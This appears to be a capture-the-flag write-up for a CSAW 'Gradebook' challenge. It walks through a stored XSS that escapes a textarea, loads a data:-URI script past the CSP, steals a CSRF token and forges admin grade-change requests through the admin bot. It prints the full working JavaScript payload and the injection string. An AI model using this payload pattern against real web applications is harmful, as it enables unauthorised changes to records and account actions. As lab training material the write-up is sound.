**Challenge name**: Gradebook

**Vulnerability** : Stored XSS in a <textarea> rendering context combined with an admin-only /grade-change endpoint protected by a CSRF token. CSP allowed data: URIs so a data:-URI script can run.

**Solution**:
## Step 1: Information Gathering
The first phase is to collect the unique identifiers for your student account.

Obtain Student ID: Log in to gradebook-app.ctf.csaw.io and navigate to your dashboard. Your student_id is the UUID in the URL.

Example URL: https://gradebook-app.ctf.csaw.io/dashboard/0575b20b-a727-44e1-bfe1-60d3ca50201c

Your student_id: 0575b20b-a727-44e1-bfe1-60d3ca50201c

Obtain Class IDs: On your dashboard, view the page source. Locate the table of your grades and copy the five class_id UUIDs from the first column of each row.

## Step 2: Payload Construction
The next phase is to construct the multi-stage exploit payload.

Prepare the JavaScript Logic: Copy the following JavaScript template. This script is designed to fetch a CSRF token and then send forged requests to change your grades.



"fetch('/grade-change').then(t=>t.text()).then(t=>{let e=new DOMParser,d=e.parseFromString(t,'text/html'),a=d.querySelector('input[name=csrf_token]').value,c='YOUR_STUDENT_ID',r=['CLASS_ID_1','CLASS_ID_2','CLASS_ID_3','CLASS_ID_4','CLASS_ID_5'];r.forEach(t=>{let e=new FormData;e.append('student_id',c),e.append('class_id',t),e.append('grade','A'),e.append('csrf_token',a),fetch('/grade-change',{method:'POST',body:e})}),location.href='/honor-roll-certificate'});"

 In the template, replace the placeholders YOUR_STUDENT_ID and CLASS_ID_1, CLASS_ID_2, etc., with the specific IDs you gathered in Step 1.

Take your entire customized JavaScript string and URL-encode it to ensure it can be safely embedded in the final payload. 

Construct the final one-line payload by inserting your URL-encoded script into the following structure. This structure is designed to escape the <textarea> context and bypass the site's Content Security Policy.

HTML

</textarea><script src="data:text/javascript,PASTE_YOUR_ENCODED_SCRIPT_HERE"></script>
## Step 3: Execution
The final phase is to inject the payload and trigger the exploit.

Go to your dashboard on gradebook-app.ctf.csaw.io. Paste your complete, final payload from Step 2.4 into any single comment box and submit the feedback form.

Copy your full dashboard URL. Navigate to gradebook-admin.ctf.csaw.io, paste your URL into the form, and submit it.

The bot will now execute your script, changing your grades. Navigate to https://gradebook-app.ctf.csaw.io/honor-roll-certificate to view the flag.
